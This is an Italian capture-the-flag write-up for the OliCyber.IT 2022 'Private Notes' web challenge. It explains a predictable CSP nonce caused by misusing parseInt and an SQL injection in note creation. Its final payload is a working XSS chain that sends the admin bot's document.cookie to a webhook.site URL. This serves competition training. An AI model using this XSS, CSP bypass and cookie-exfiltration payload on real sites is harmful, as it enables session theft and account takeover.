# OliCyber.IT 2022 - Competizione nazionale

## [web-2] Private Notes (2 risoluzioni)

La challenge consiste in un sito web che permette di creare delle note private senza bisongo di autenticazione.

Nel sito è anche presente un form per segnalare un url, che verrà visitato da un admin.

La flag è contenuta all'interno del cookie dell'admin.

### Soluzione

La creazione delle note permette di inserire html all'interno della pagina, senza nessun controllo.

Ottenere XSS non è però immediato, a causa della CSP che stabilisce quali script possono essere eseguiti nella pagina.

L'header CSP restituito dalla pagina è nel seguente formato
`Content-Security-Policy: script-src 'nonce-RcSMzi4tf73qGvxRx8atJg==';`

Questo header stabilisce che un tag `script` potrà essere eseguito in questa pagina solo se ha come attributo `nonce="RcSMzi4tf73qGvxRx8atJg==`.

Per riuscire a bypassare una CSP di questo tipo bisogna poter prevedere il nonce generato e inserirlo all'interno del tag script che si vuole eseguire.

Analizzando la generazione del nonce:

```javascript
const random = parseInt(Math.random() * 100000000000000000000000);
res.locals.csp_nonce = crypto
  .createHash("md5")
  .update(`${random}`)
  .digest("base64");
```

La funzione `parseInt` viene usata incorrettamente, dovrebbe essere usata per trasformare una stringa in un intero.

Usando questa funzione con un numero come input le trasformazioni applicate sono:
`Numero -> Stringa -> Numero`

I numeri random che vengono convertiti sono molto grandi, in questo caso la conversione si comporta in questo modo:
`74296751904041288062370 -> "7.429675190404129e+22" -> 7`

A causa di questo bug, il numero random generato è nella stragrande maggioranza dei casi un numero tra 1 e 9.

Grazie a questa informazione si possono generare i 9 possibili tag con i rispettivi nonce per ottenere XSS.

I tag devono essere inseriti all'interno di un iframe per assicurare che venga tentata l'esecuzione da parte del browser, essendo inseriti dopo il rendering all'interno dell'html.

Esempio di payload per ottenere XSS:

```html
<iframe
  srcdoc="<script nonce=xMpCOKC5I4INzFCab3WEmw==>alert(1)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=yB5yjZ1ML2NvBn+JzBSGLA==>alert(1)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=7MvIfktc4v4oMI/Z8qe68w==>alert(1)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=qH/2eaLz5x2RgaZ7dUISLA==>alert(1)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=5No7f7vOI0XXdysGdKMY1Q==>alert(1)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=FnkJHFqID69vteYIfrGy3A==>alert(1)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=jxTkX87qFnpaNt7dS+olQw==>alert(1)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=yfD4lfuYq5FZ9R/QKX4jbQ==>alert(1)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=RcSMzi4tf73qGvxRx8atJg==>alert(1)</script>"
></iframe>
```

Fino a questo momento l'XSS è possibile solo nei confronti di chi ha creato la nota con il payload, per poter ottenere XSS sul bot dell'admin bisogna inserire una nota a suo nome.

Per farlo si può sfruttare la SQL injection presente nella creazione della nota.

`` await db_get(`INSERT INTO notes (noteid, userid, content) VALUES (${noteid}, ${req.loggedUserId}, '${content}')`)  ``

Il contenuto è controllato da noi e può essere sfruttato per inserire un altra riga nella tabella `notes`.

Inserendo come contenuto `aaa'), (1337,1,'payload` verrà creata una nota con id 1337 e contenuto "payload" visibile solo dall'utente con id 1.

### Exploit

Sapendo che l'user_id usato dall'admin è 0 (visibile in `bot.js`) possiamo mettere insieme gli step descritti e rubare il cookie all'admin.

Il payload finale può essere:

```html
AAA'), (1337,0,'
<iframe
  srcdoc="<script nonce=xMpCOKC5I4INzFCab3WEmw==>fetch(`https://webhook.site/a3e62b3a-7ebb-43d6-a753-2ffe70ab38c1/?`+document.cookie)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=yB5yjZ1ML2NvBn+JzBSGLA==>fetch(`https://webhook.site/a3e62b3a-7ebb-43d6-a753-2ffe70ab38c1/?`+document.cookie)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=7MvIfktc4v4oMI/Z8qe68w==>fetch(`https://webhook.site/a3e62b3a-7ebb-43d6-a753-2ffe70ab38c1/?`+document.cookie)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=qH/2eaLz5x2RgaZ7dUISLA==>fetch(`https://webhook.site/a3e62b3a-7ebb-43d6-a753-2ffe70ab38c1/?`+document.cookie)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=5No7f7vOI0XXdysGdKMY1Q==>fetch(`https://webhook.site/a3e62b3a-7ebb-43d6-a753-2ffe70ab38c1/?`+document.cookie)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=FnkJHFqID69vteYIfrGy3A==>fetch(`https://webhook.site/a3e62b3a-7ebb-43d6-a753-2ffe70ab38c1/?`+document.cookie)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=jxTkX87qFnpaNt7dS+olQw==>fetch(`https://webhook.site/a3e62b3a-7ebb-43d6-a753-2ffe70ab38c1/?`+document.cookie)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=yfD4lfuYq5FZ9R/QKX4jbQ==>fetch(`https://webhook.site/a3e62b3a-7ebb-43d6-a753-2ffe70ab38c1/?`+document.cookie)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=RcSMzi4tf73qGvxRx8atJg==>fetch(`https://webhook.site/a3e62b3a-7ebb-43d6-a753-2ffe70ab38c1/?`+document.cookie)</script>"
></iframe>
```

Per eseguire la XSS basta inviare l'url `privatenotes.challs.olicyber.it/notes#1337` da visitare al bot. Il cookie verrà così inviato al nostro webhook.

La flag è encodata dentro il jwt dell'admin, per leggerla basta decodificare il base64 o usare un decoder come quello presente su `jwt.io`
